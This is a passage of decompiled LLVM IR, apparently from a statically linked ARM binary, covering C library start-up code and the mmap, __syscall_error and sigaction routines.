dec_label_pc_145b0:                               ; preds = %dec_label_pc_14590
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_145b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_145b4 = add i32 %v0_145b4, 164
  %v3_145b4 = inttoptr i32 %v2_145b4 to i32*
  %v4_145b4 = load i32, i32* %v3_145b4, align 4
  store i32 %v4_145b4, i32* %r3.global-to-local, align 4
  %v2_145b8 = inttoptr i32 %v4_145b4 to i32*
  store i32 %v2_145a4, i32* %v2_145b8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_145c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_145c0 = inttoptr i32 %v0_145c0 to i32*
  %v2_145c0 = load i32, i32* %v1_145c0, align 4
  store i32 %v2_145c0, i32* %r0.global-to-local, align 4
  %v4_145c4 = call i32 @__GI_strrchr(i32 %v2_145c0, i32 47, i32 %v2_14598, i32 %v4_145b4)
  store i32 %v4_145c4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_145cc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_145cc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_145d0 = icmp eq i32 %v4_145c4, 0
  store i1 %v2_145d0, i1* %cpsr_z.global-to-local, align 1
  %v2_145d4 = add i32 %v2_145cc, 96
  %v3_145d4 = inttoptr i32 %v2_145d4 to i32*
  %v4_145d4 = load i32, i32* %v3_145d4, align 4
  store i32 %v4_145d4, i32* %r2.global-to-local, align 4
  br i1 %v2_145d0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_145b0
  %v2_145dc58 = inttoptr i32 %v4_145d4 to i32*
  store i32 0, i32* %v2_145dc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_145b0
  %v2_145d8 = add i32 %v4_145c4, 1
  store i32 %v2_145d8, i32* %r3.global-to-local, align 4
  %v2_145dc = inttoptr i32 %v4_145d4 to i32*
  store i32 %v4_145c4, i32* %v2_145dc, align 4
  %v1_145e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_145e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_145e0 = inttoptr i32 %v2_145e0 to i32*
  store i32 %v1_145e0, i32* %v3_145e0, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_14590
  %v2_145f0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_145f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_145fc = add i32 %v2_145f0, -12
  store i32 %v2_145fc, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1460c = add i32 %v2_145f0, 2004
  %v4_1460c = inttoptr i32 %v3_1460c to i32*
  store i32 %arg5, i32* %v4_1460c, align 4
  %v0_1462418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1462419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1462421 = icmp uge i32 %v0_1462418, %v1_1462419
  store i1 %v3_1462421, i1* %cpsr_c.global-to-local, align 1
  %v9_1462427 = icmp eq i32 %v0_1462418, %v1_1462419
  store i1 %v9_1462427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1462421, label %dec_label_pc_14658.lr.ph, label %dec_label_pc_14614

dec_label_pc_14614:                               ; preds = %bb84, %dec_label_pc_14614
  %v1_14614 = phi i32 [ %v1_14620, %dec_label_pc_14614 ], [ %v0_1462418, %bb84 ]
  %v0_14614 = load i32, i32* %r5.global-to-local, align 4
  %v2_14614 = and i32 %v1_14614, 1073741824
  %v3_14614 = icmp ne i32 %v2_14614, 0
  store i1 %v3_14614, i1* %cpsr_c.global-to-local, align 1
  %v4_14614 = mul i32 %v1_14614, 4
  %v5_14614 = add i32 %v4_14614, %v0_14614
  %v6_14614 = inttoptr i32 %v5_14614 to i32*
  %v7_14614 = load i32, i32* %v6_14614, align 4
  store i32 %v7_14614, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14614)
  %v0_14620 = load i32, i32* %r4.global-to-local, align 4
  %v1_14620 = add i32 %v0_14620, 1
  store i32 %v1_14620, i32* %r4.global-to-local, align 4
  %v1_14624 = load i32, i32* %r7.global-to-local, align 4
  %v3_14624 = icmp uge i32 %v1_14620, %v1_14624
  store i1 %v3_14624, i1* %cpsr_c.global-to-local, align 1
  %v9_14624 = icmp eq i32 %v1_14620, %v1_14624
  store i1 %v9_14624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14624, label %dec_label_pc_14658.lr.ph, label %dec_label_pc_14614

dec_label_pc_14658.lr.ph:                         ; preds = %dec_label_pc_14614, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1462c = icmp eq i32 %v0_14478, 0
  store i1 %v2_1462c, i1* %cpsr_z.global-to-local, align 1
  %v2_14634 = xor i1 %v2_1462c, true
  call void @__pseudo_cond_branch(i1 %v2_14634, i32 %v0_14478)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_14640 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1464c = add i32 %v2_14640, -12
  store i32 %v2_1464c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14658

dec_label_pc_14658:                               ; preds = %dec_label_pc_14658.dec_label_pc_14658_crit_edge, %dec_label_pc_14658.lr.ph
  %v1_14658 = phi i32 [ %v1_14664, %dec_label_pc_14658.dec_label_pc_14658_crit_edge ], [ 0, %dec_label_pc_14658.lr.ph ]
  %v0_14658 = phi i32 [ %v0_14658.pre, %dec_label_pc_14658.dec_label_pc_14658_crit_edge ], [ %v2_1464c, %dec_label_pc_14658.lr.ph ]
  %v2_14658 = and i32 %v1_14658, 1073741824
  %v3_14658 = icmp ne i32 %v2_14658, 0
  store i1 %v3_14658, i1* %cpsr_c.global-to-local, align 1
  %v4_14658 = mul i32 %v1_14658, 4
  %v5_14658 = add i32 %v4_14658, %v0_14658
  %v6_14658 = inttoptr i32 %v5_14658 to i32*
  %v7_14658 = load i32, i32* %v6_14658, align 4
  store i32 %v7_14658, i32* %ip.global-to-local, align 4
  store i32 83556, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14658)
  %v0_14664 = load i32, i32* @r4, align 4
  %v1_14664 = add i32 %v0_14664, 1
  store i32 %v1_14664, i32* @r4, align 4
  %v1_14668 = load i32, i32* @r7, align 4
  %v3_14668 = icmp uge i32 %v1_14664, %v1_14668
  store i1 %v3_14668, i1* %cpsr_c.global-to-local, align 1
  %v9_14668 = icmp eq i32 %v1_14664, %v1_14668
  store i1 %v9_14668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14668, label %dec_label_pc_14670, label %dec_label_pc_14658.dec_label_pc_14658_crit_edge

dec_label_pc_14658.dec_label_pc_14658_crit_edge:  ; preds = %dec_label_pc_14658
  %v0_14658.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14658

dec_label_pc_14670:                               ; preds = %dec_label_pc_14658
  %v2_14674.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14674.pre, i32* %r0.global-to-local, align 4
  %v2_14678 = add i32 %v2_14674.pre, -66996
  store i32 %v2_14678, i32* %r2.global-to-local, align 4
  store i32 %v2_14678, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14680 = icmp eq i32 %v2_14678, 0
  store i1 %v2_14680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14680, label %dec_label_pc_14698, label %dec_label_pc_14688

dec_label_pc_14688:                               ; preds = %dec_label_pc_14670
  store i32 83600, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_14678)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14694 = load i32, i32* %r0.global-to-local, align 4
  %v2_14694 = inttoptr i32 %v1_14694 to i32*
  store i32 0, i32* %v2_14694, align 4
  %v2_1469c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_14698

dec_label_pc_14698:                               ; preds = %dec_label_pc_14670, %dec_label_pc_14688
  %v2_1469c = phi i32 [ %v2_14674.pre, %dec_label_pc_14670 ], [ %v2_1469c.pre, %dec_label_pc_14688 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_1469c, i32* %r1.global-to-local, align 4
  %v2_146a0 = add i32 %v2_1469c, 128
  %v3_146a0 = inttoptr i32 %v2_146a0 to i32*
  %v4_146a0 = load i32, i32* %v3_146a0, align 4
  store i32 %v4_146a0, i32* %r2.global-to-local, align 4
  store i32 %v4_146a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146a8 = icmp eq i32 %v4_146a0, 0
  store i1 %v2_146a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146a8, label %dec_label_pc_146c0, label %dec_label_pc_146b0

dec_label_pc_146b0:                               ; preds = %dec_label_pc_14698
  store i32 83640, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_146a0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_146bc = load i32, i32* %r0.global-to-local, align 4
  %v2_146bc = inttoptr i32 %v1_146bc to i32*
  store i32 0, i32* %v2_146bc, align 4
  br label %dec_label_pc_146c0

dec_label_pc_146c0:                               ; preds = %dec_label_pc_14698, %dec_label_pc_146b0
  %v2_146c0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_146c0, i32* @r0, align 4
  %v1_146c4 = call i32 @_setjmp(i32 %v2_146c0)
  store i32 %v1_146c4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146c8 = icmp eq i32 %v1_146c4, 0
  store i1 %v2_146c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146c8, label %dec_label_pc_146d0, label %dec_label_pc_1471c

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146c0
  %v0_146d0 = call i32 @__aeabi_read_tp()
  store i32 %v0_146d0, i32* %r0.global-to-local, align 4
  %v1_146d4 = add i32 %v0_146d0, -1168
  store i32 %v1_146d4, i32* %r2.global-to-local, align 4
  %v2_146dc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_146dc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_146e8 = add i32 %v2_146dc, 56
  %v3_146e8 = inttoptr i32 %v2_146e8 to i32*
  %v4_146e8 = load i32, i32* %v3_146e8, align 4
  store i32 %v4_146e8, i32* %ip.global-to-local, align 4
  store i32 %v2_146c0, i32* %r3.global-to-local, align 4
  %v2_146f8 = add i32 %v0_146d0, -1040
  %v3_146f8 = inttoptr i32 %v2_146f8 to i32*
  store i32 %v2_146c0, i32* %v3_146f8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_14704 = load i32, i32* %ip.global-to-local, align 4
  %v1_14704 = inttoptr i32 %v0_14704 to i32*
  %v2_14704 = load i32, i32* %v1_14704, align 4
  store i32 %v2_14704, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_14714 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_147b8

dec_label_pc_1471c:                               ; preds = %dec_label_pc_146c0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_14720 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14720, i32* %ip.global-to-local, align 4
  %v2_14724 = add i32 %v2_14720, 40
  %v3_14724 = inttoptr i32 %v2_14724 to i32*
  %v4_14724 = load i32, i32* %v3_14724, align 4
  store i32 %v4_14724, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14724)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_14734 = load i32, i32* %stack_var_-416, align 4
  %v2_14738 = add i32 %v2_14734, 120
  %v3_14738 = inttoptr i32 %v2_14738 to i32*
  %v4_14738 = load i32, i32* %v3_14738, align 4
  store i32 %v4_14738, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1473c

dec_label_pc_1473c:                               ; preds = %dec_label_pc_14770.dec_label_pc_1473c_crit_edge, %dec_label_pc_1471c
  %v0_1473c = phi i32 [ %v0_1473c.pre, %dec_label_pc_14770.dec_label_pc_1473c_crit_edge ], [ %v4_14738, %dec_label_pc_1471c ]
  %v1_1473c = inttoptr i32 %v0_1473c to i32*
  %v2_1473c = load i32, i32* %v1_1473c, align 4
  store i32 %v0_1473c, i32* %r2.global-to-local, align 4
  store i32 %v2_1473c, i32* %r4.global-to-local, align 4
  %v1_14748 = add i32 %v2_1473c, -1
  store i32 %v1_14748, i32* %r1.global-to-local, align 4
  %v2_1474c89 = load i32, i32* %v1_1473c, align 4
  store i32 %v2_1474c89, i32* %r3.global-to-local, align 4
  %v3_1475091 = icmp uge i32 %v2_1474c89, %v2_1473c
  store i1 %v3_1475091, i1* %cpsr_c.global-to-local, align 1
  %v9_1475097 = icmp eq i32 %v2_1474c89, %v2_1473c
  store i1 %v9_1475097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1475097, label %dec_label_pc_14758, label %dec_label_pc_14770

dec_label_pc_14758:                               ; preds = %dec_label_pc_1473c, %dec_label_pc_14758.dec_label_pc_1474c_crit_edge
  %v0_1475898 = phi i32 [ %v1_14750.pre, %dec_label_pc_14758.dec_label_pc_1474c_crit_edge ], [ %v2_1473c, %dec_label_pc_1473c ]
  store i32 %v0_1475898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14768 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14768, label %dec_label_pc_1476c, label %dec_label_pc_14758.dec_label_pc_1474c_crit_edge

dec_label_pc_14758.dec_label_pc_1474c_crit_edge:  ; preds = %dec_label_pc_14758
  %v0_1474c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14750.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1474c = inttoptr i32 %v0_1474c.pre to i32*
  %v2_1474c = load i32, i32* %v1_1474c, align 4
  store i32 %v2_1474c, i32* %r3.global-to-local, align 4
  %v3_14750 = icmp uge i32 %v2_1474c, %v1_14750.pre
  store i1 %v3_14750, i1* %cpsr_c.global-to-local, align 1
  %v9_14750 = icmp eq i32 %v2_1474c, %v1_14750.pre
  store i1 %v9_14750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14750, label %dec_label_pc_14758, label %dec_label_pc_14770

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14758
  %v0_1476c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1476c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14770

dec_label_pc_14770:                               ; preds = %dec_label_pc_1473c, %dec_label_pc_14758.dec_label_pc_1474c_crit_edge, %dec_label_pc_1476c
  %v0_14778 = phi i32 [ %v0_1476c, %dec_label_pc_1476c ], [ %v2_1474c89, %dec_label_pc_1473c ], [ %v2_1474c, %dec_label_pc_14758.dec_label_pc_1474c_crit_edge ]
  %v1_14770 = phi i32 [ %v0_1476c, %dec_label_pc_1476c ], [ %v2_1473c, %dec_label_pc_1473c ], [ %v1_14750.pre, %dec_label_pc_14758.dec_label_pc_1474c_crit_edge ]
  %v3_14770 = icmp uge i32 %v0_14778, %v1_14770
  store i1 %v3_14770, i1* %cpsr_c.global-to-local, align 1
  %v9_14770 = icmp eq i32 %v0_14778, %v1_14770
  store i1 %v9_14770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14770, label %dec_label_pc_14778, label %dec_label_pc_14770.dec_label_pc_1473c_crit_edge

dec_label_pc_14770.dec_label_pc_1473c_crit_edge:  ; preds = %dec_label_pc_14770
  %v0_1473c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1473c

dec_label_pc_14778:                               ; preds = %dec_label_pc_14770
  %v2_14778 = icmp ne i32 %v1_14770, 0
  store i1 %v2_14778, i1* %cpsr_c.global-to-local, align 1
  %v7_14778 = icmp eq i32 %v1_14770, 1
  store i1 %v7_14778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14778, label %dec_label_pc_147b8, label %dec_label_pc_14780

dec_label_pc_14780:                               ; preds = %dec_label_pc_14778
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_147b8

dec_label_pc_147b8:                               ; preds = %dec_label_pc_14778, %dec_label_pc_14780, %dec_label_pc_146d0
  %storemerge2 = phi i32 [ %v0_14714, %dec_label_pc_146d0 ], [ 0, %dec_label_pc_14780 ], [ 0, %dec_label_pc_14778 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_147bc = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_147bc, i32* %r0.global-to-local, align 4
  %v0_147c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_147c0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_147b8
  %v2_147c0 = load i32, i32* @r8, align 4
  %v8_147c4 = shl i32 %v2_147c0, %v1_147bc
  %v9_147c4 = and i32 %v8_147c4, %v1_147bc
  %v8_147c8 = lshr i32 %v2_147c0, %v9_147c4
  %v9_147c8 = and i32 %v8_147c8, %v9_147c4
  %v2_147cc = inttoptr i32 %v9_147c8 to i64*
  %v3_147cc = load i64, i64* %v2_147cc, align 4
  %v5_147cc = trunc i64 %v3_147cc to i32
  %v6_147cc = udiv i64 %v3_147cc, 4294967296
  %v7_147cc = trunc i64 %v6_147cc to i32
  store i32 %v5_147cc, i32* %r1.global-to-local, align 4
  %v9_147cc = sub i32 %v7_147cc, %v2_147c0
  %v1_147d0 = load i32, i32* %r4.global-to-local, align 4
  %v3_147d0 = mul i32 %v9_147cc, %v1_147d0
  %v5_147d8 = mul i32 %v1_147d0, 4
  %v5_147dc = udiv i32 %v1_147d0, 2
  %v6_147d8 = and i32 %v5_147dc, %v5_147d8
  %v6_147dc = and i32 %v6_147d8, %v3_147d0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_147dc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_147b8, %bb85
  %v5_147e0 = phi i32 [ %v1_147bc, %dec_label_pc_147b8 ], [ %v6_147dc, %bb85 ]
  ret i32 %v5_147e0

; uselistorder directives
  uselistorder i32 %v1_147d0, { 1, 0, 2 }
  uselistorder i32 %v1_147bc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_14770, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1476c, { 1, 0, 2 }
  uselistorder i32 %v1_14750.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1473c, { 1, 0 }
  uselistorder i32 %v2_1469c, { 1, 0 }
  uselistorder i32 %v2_14674.pre, { 2, 0, 1 }
  uselistorder i32 %v1_14668, { 1, 0 }
  uselistorder i32 %v1_14664, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14658, { 1, 0 }
  uselistorder i32 %v1_14624, { 1, 0 }
  uselistorder i32 %v1_14620, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14614, { 1, 0 }
  uselistorder i32 %v2_145f0, { 1, 0, 2 }
  uselistorder i32 %v4_145d4, { 1, 0, 2 }
  uselistorder i32 %v4_145c4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1450c, { 1, 2, 0 }
  uselistorder i32 %v2_144d8, { 1, 2, 0 }
  uselistorder i32 %v1_144d4, { 1, 2, 0 }
  uselistorder i1 %v2_144c0, { 1, 0, 2 }
  uselistorder i32 %v5_144c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14490, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14478, { 1, 0, 2 }
  uselistorder i32 %v2_1446c, { 1, 0, 2 }
  uselistorder i32 %v3_1443c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 1, 9, 10, 11, 12, 0, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 0, 10, 11, 12, 14, 13, 3, 15, 17, 16, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 1, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 4, 6, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_147b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14770, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14758, { 1, 0 }
  uselistorder label %dec_label_pc_146c0, { 1, 0 }
  uselistorder label %dec_label_pc_14698, { 1, 0 }
  uselistorder label %dec_label_pc_14614, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14590, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14568, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_144d8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_144c0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1480c = load i32, i32* @r4, align 4
  store i32 %v3_1480c, i32* %stack_var_-16, align 4
  %v3_14818 = urem i32 %arg3, 4096
  %v2_1481c = icmp eq i32 %v3_14818, 0
  br i1 %v2_1481c, label %dec_label_pc_14840, label %dec_label_pc_14824

dec_label_pc_14824:                               ; preds = %entry
  %v0_14828 = call i32 @__aeabi_read_tp()
  store i32 %v0_14828, i32* %r0.global-to-local, align 4
  %v3_1482c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1482c = sext i16 %v3_1482c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14838 = add i32 %v4_1482c, %v0_14828
  %v4_14838 = inttoptr i32 %v3_14838 to i32*
  store i32 22, i32* %v4_14838, align 4
  %v0_14874.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14874

dec_label_pc_14840:                               ; preds = %entry
  %v0_14850 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14850, -4095
  br i1 %tmp, label %dec_label_pc_14870, label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %dec_label_pc_14840
  %v1_1485c = sub i32 0, %v0_14850
  %v3_14860 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14860 = sext i16 %v3_14860 to i32
  %v0_14864 = call i32 @__aeabi_read_tp()
  %v3_14868 = add i32 %v4_14860, %v0_14864
  %v4_14868 = inttoptr i32 %v3_14868 to i32*
  store i32 %v1_1485c, i32* %v4_14868, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14870

dec_label_pc_14870:                               ; preds = %dec_label_pc_14840, %dec_label_pc_14858
  %v0_14870 = phi i32 [ %v0_14850, %dec_label_pc_14840 ], [ -1, %dec_label_pc_14858 ]
  store i32 %v0_14870, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14874

dec_label_pc_14874:                               ; preds = %dec_label_pc_14824, %dec_label_pc_14870
  %v0_14874 = phi i32 [ %v0_14874.pre, %dec_label_pc_14824 ], [ %v0_14870, %dec_label_pc_14870 ]
  store i32 %v0_14874, i32* %r0.global-to-local, align 4
  %v2_14878 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14878, i32* @r4, align 4
  ret i32 %v0_14874

; uselistorder directives
  uselistorder i32 %v0_14874, { 1, 0 }
  uselistorder i32 %v0_14850, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_14874, { 1, 0 }
  uselistorder label %dec_label_pc_14870, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_14888 = load i32, i32* @lr, align 4
  store i32 %v0_14888, i32* %stack_var_-4, align 4
  %v0_14890 = load i32, i32* @r0, align 4
  %v3_14894 = load i16, i16* @global_var_216f0.341, align 2
  %v4_14894 = sext i16 %v3_14894 to i32
  store i32 %v4_14894, i32* @r2, align 4
  %v0_14898 = call i32 @__aeabi_read_tp()
  %v1_1489c = sub i32 0, %v0_14890
  store i32 %v1_1489c, i32* @r3, align 4
  %v2_148a0 = load i32, i32* @r2, align 4
  %v3_148a0 = add i32 %v2_148a0, %v0_14898
  %v4_148a0 = inttoptr i32 %v3_148a0 to i32*
  store i32 %v1_1489c, i32* %v4_148a0, align 4
  %v2_148a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_148a8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_148b4 = load i32, i32* @r4, align 4
  %v6_148b4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_148bc = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_148bc, label %dec_label_pc_14910, label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %entry
  %v1_148d4 = add i32 %arg2, 4
  %v2_148d4 = inttoptr i32 %v1_148d4 to i32*
  %v3_148d4 = load i32, i32* %v2_148d4, align 4
  store i32 %v3_148d4, i32* @r3, align 4
  %v1_148d8 = and i32 %v3_148d4, 67108864
  %v2_148d8 = icmp eq i32 %v1_148d8, 0
  br i1 %v2_148d8, label %dec_label_pc_148e0, label %dec_label_pc_14910

dec_label_pc_148e0:                               ; preds = %dec_label_pc_148d4
  store i32 20, i32* @r2, align 4
  %v2_148e4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_148e4, i32* @r0, align 4
  %v0_148e8 = call i32 @memcpy()
  store i32 %v2_148e4, i32* @ip, align 4
  %v0_14910.pre = load i32, i32* @r5, align 4
  %v0_14918.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14910

dec_label_pc_14910:                               ; preds = %dec_label_pc_148d4, %entry, %dec_label_pc_148e0
  %v0_14918 = phi i32 [ %arg3, %dec_label_pc_148d4 ], [ %arg3, %entry ], [ %v0_14918.pre, %dec_label_pc_148e0 ]
  %v0_14914 = phi i32 [ %arg2, %dec_label_pc_148d4 ], [ 0, %entry ], [ %v2_148e4, %dec_label_pc_148e0 ]
  %v0_14910 = phi i32 [ %arg1, %dec_label_pc_148d4 ], [ %arg1, %entry ], [ %v0_14910.pre, %dec_label_pc_148e0 ]
